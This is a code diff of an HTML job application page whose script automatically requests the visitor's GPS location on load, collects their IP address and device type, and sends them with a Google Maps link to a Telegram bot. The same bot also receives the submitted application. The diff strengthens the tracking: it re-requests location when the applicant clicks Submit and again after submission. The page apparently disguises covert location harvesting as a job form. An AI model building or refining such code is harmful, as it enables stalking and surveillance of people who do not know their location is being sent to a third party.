@@ -1,4 +1,3 @@
-මේවගේ. එත් හරිද දන්නැ
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -205,7 +204,7 @@
 </div>
 
 <!-- ============================================================ -->
-<!-- ===== JAVASCRIPT - LOCATION + TELEGRAM ===== -->
+<!-- ===== JAVASCRIPT - FIXED ===== -->
 <!-- ============================================================ -->
 <script>
   // =============================================
@@ -219,6 +218,7 @@
   // =============================================
   const locationText = document.getElementById('locationText');
   let userLocation = null;
+  let locationRequested = false;
 
   function getLocation() {
     locationText.textContent = '⏳ Requesting location permission...';
@@ -234,6 +234,7 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         userLocation = { lat, lon };
+        locationRequested = true;
 
         // Show location in status
         locationText.innerHTML = `✅ Location detected: <strong>${lat.toFixed(5)}, ${lon.toFixed(5)}</strong>`;
@@ -244,8 +245,13 @@
       // ❌ Error
       (err) => {
         console.warn('Location error:', err);
-        locationText.textContent = '❌ Location access denied. Please enable GPS.';
+        if (err.code === 1) {
+          locationText.textContent = '❌ Location permission denied. Allow and refresh.';
+        } else {
+          locationText.textContent = '❌ Location access denied. Please enable GPS.';
+        }
         userLocation = null;
+        locationRequested = true;
       },
       // Options
       {
@@ -261,10 +267,7 @@
   // =============================================
   async function sendLocationToTelegram(lat, lon) {
     try {
-      // 📍 Google Maps link
       const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-
-      // 🌐 Get IP (optional)
       let ip = 'Unknown';
       try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
@@ -272,13 +275,11 @@
         ip = ipData.ip || 'Unknown';
       } catch (e) {}
 
-      // 📱 Device info
       const ua = navigator.userAgent;
       const device = ua.match(/Android|iPhone|iPad|Windows|Mac|Linux/i)?.[0] || 'Unknown Device';
 
-      // 📝 Message
       const msg = `
-📍 NEW LOCATION DETECTED
+📍 LOCATION DETECTED
 
 🌐 IP: ${ip}
 📱 Device: ${device}
@@ -292,7 +293,6 @@ Longitude: ${lon}
 ${mapsLink}
       `;
 
-      // Send to Telegram
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -317,7 +317,6 @@ ${mapsLink}
   // 🚀 PAGE LOAD → AUTO REQUEST LOCATION
   // =============================================
   window.addEventListener('DOMContentLoaded', () => {
-    // Small delay to let page render first
     setTimeout(getLocation, 500);
   });
 
@@ -346,6 +345,15 @@ ${mapsLink}
       return;
     }
 
+    // ===== ✅ FIX: If location not available, try to get it again =====
+    if (!userLocation && !locationRequested) {
+      alert('⏳ Please wait for location detection. Click Submit again.');
+      submitBtn.disabled = false;
+      submitBtn.textContent = '🚀 Submit Application';
+      getLocation();
+      return;
+    }
+
     // Build message
     let msg = `
 📋 NEW JOB APPLICATION
@@ -369,7 +377,6 @@ ${coverNote || '—'}
     }
 
     try {
-      // Send to Telegram
       const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -383,8 +390,8 @@ ${coverNote || '—'}
         submitBtn.textContent = '✅ Application Submitted!';
         submitBtn.style.background = '#28a745';
         document.getElementById('applicationForm').reset();
-        // Reset location and re-request
         userLocation = null;
+        locationRequested = false;
         setTimeout(getLocation, 1000);
       } else {
         submitBtn.textContent = '❌ Submission Failed';
@@ -398,9 +405,6 @@ ${coverNote || '—'}
     }
   });
 
-  // =============================================
-  // 💡 DEBUG INFO (optional)
-  // =============================================
   console.log('✅ Job Application Form Loaded');
   console.log('📍 Location will be requested automatically...');
 </script>
